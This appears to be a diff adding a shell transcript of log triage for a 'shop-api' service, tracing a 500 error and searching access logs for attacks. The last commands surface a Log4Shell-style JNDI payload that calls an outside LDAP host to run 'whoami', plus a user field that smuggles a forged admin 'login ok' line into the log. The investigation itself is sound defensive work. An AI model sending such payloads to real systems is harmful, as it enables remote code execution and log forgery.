@@ -1,0 +1,25 @@
+$ RID=$(awk '$9 == 500 {print $NF}' logs/access.log | head -n 1 | cut -d= -f2); grep "$RID" logs/access.log; jq -c --arg r "$RID" 'select(.rid == $r)' logs/access.json
+198.51.100.23 - - [23/Nov/2026:20:34:33 +0000] "GET /api/orders/1007 HTTP/1.1" 500 37 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36" rt=0.030 urt=0.030 rid=54e843c7f3025d4f7f57dbacf67cfaea
+{"time":"2026-11-23T20:34:33+00:00","ip":"198.51.100.23","method":"GET","uri":"/api/orders/1007","status":500,"bytes":37,"rt":0.030,"urt":"0.030","rid":"54e843c7f3025d4f7f57dbacf67cfaea","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"}
+$ wc -l logs/app.log; jq -R 'fromjson?' logs/app.log | jq -s length
+448 logs/app.log
+435
+$ jq -R -c 'fromjson? | select(.level == 50 and .err) | {"@timestamp": (.time / 1000 | todate), "log.level": "error", "service.name": .service, message: .msg, "trace.id": .req.id, "http.request.method": .req.method, "url.path": .req.url, "error.type": .err.type, "error.message": .err.message}' logs/app.log | head -n 1 | jq .
+{
+  "@timestamp": "2026-11-23T20:34:33Z",
+  "log.level": "error",
+  "service.name": "shop-api",
+  "message": "inventory call failed",
+  "trace.id": "54e843c7f3025d4f7f57dbacf67cfaea",
+  "http.request.method": "GET",
+  "url.path": "/api/orders/1007",
+  "error.type": "TypeError",
+  "error.message": "fetch failed: connect ECONNREFUSED 127.0.0.1:41999"
+}
+$ grep -m1 'jndi' logs/access.log | cut -c1-220
+203.0.113.66 - - [23/Nov/2026:20:34:37 +0000] "GET /api/products?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.66%3A1389%2Fa%7D HTTP/1.1" 200 38 "-" "${jndi:ldap://203.0.113.66:1389/Basic/Command/whoami}" rt=0.006 urt=0.006 rid=
+$ jq -c 'select(.ua | test("jndi")) | {ip, uri, ua}' logs/access.json
+{"ip":"203.0.113.66","uri":"/api/products?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.66%3A1389%2Fa%7D","ua":"${jndi:ldap://203.0.113.66:1389/Basic/Command/whoami}"}
+$ grep -c 'login failed' logs/app.log; grep 'level\\":30' logs/app.log | jq -c '{level, msg, user}'
+13
+{"level":40,"msg":"login failed: bad credentials","user":"bob\n{\"level\":30,\"msg\":\"login ok\",\"user\":\"admin\"}"}
